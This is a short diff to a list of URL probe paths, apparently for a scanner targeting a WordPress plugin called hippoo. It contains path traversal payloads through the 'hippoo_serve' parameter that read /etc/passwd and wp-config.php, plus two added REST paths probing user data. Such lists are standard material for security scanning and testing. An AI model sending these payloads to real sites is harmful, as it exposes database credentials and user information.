@@ -1,3 +1,5 @@
 /wp-content/plugins/hippoo/readme.txt
 /?hippoo_serve=../../../../../../../etc/passwd
 /?hippoo_serve=../../../../wp-config.php
+/?rest_route=/wc-hippoo/v1/ext/wp/v2/users/1
+/wp-json/wc-hippoo/v1/ext/wp/v2/users/1
